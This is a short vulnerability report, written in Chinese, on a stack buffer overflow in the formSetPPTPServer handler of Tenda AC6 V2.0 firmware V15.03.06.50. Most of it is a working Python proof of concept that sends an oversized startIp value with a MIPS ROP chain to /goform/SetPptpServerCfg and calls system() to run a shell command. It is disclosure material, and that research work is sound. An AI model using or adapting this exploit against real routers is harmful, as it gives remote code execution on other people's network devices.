# tenda AC6V2.0 缓冲区溢出漏洞报告  

## 漏洞描述  

在 tenda AC6V2.0 的 `formSetPPTPServer` 函数中，存在缓冲区溢出漏洞。该漏洞可能导致攻击者利用恶意输入，覆盖内存中其他重要数据，从而可能导致设备崩溃或执行任意代码。  

## 影响版本  

- V15.03.06.50  

## 代码审计

满足一定条件后，参数startIp的值将被通过sscanf复制给栈上变量，导致溢出

<img width="470" alt="{BE84087B-29EB-4534-98CF-CBCF2295D90A}" src="https://github.com/user-attachments/assets/8d81d844-7511-4325-ab77-3e625f902f78">



## 漏洞利用证明 (POC)  

```plaintext
import requests
from pwn import *

target_ip = "192.168.0.1"
target_port = 80
cookie = {"bLanguage":"zh", "password":"dmg23f"}

libcbase = 0x7f526000
mov_a0_jmp_sp = 0x28D58 + libcbase    #|addiu $a0,0x20($sp)|  jr   0x1C($sp) |
cmd = b"echo 123 > 1.txt"
system = 0x7f710b10

rop=p32(mov_a0_jmp_sp)+0x1c*b'a'+p32(system)+cmd

def exp_startIp():
	url = f"http://{target_ip}/goform/SetPptpServerCfg" 
	payload = b'a'*0x170+rop+b'.0.0.0'	
	data = {"serverEn": "1",
		"startIp": payload,
		"endIp": "a"
	}
	response = requests.post(url, cookies=cookie, data=data)
	print(response.text)

exp_startIp()
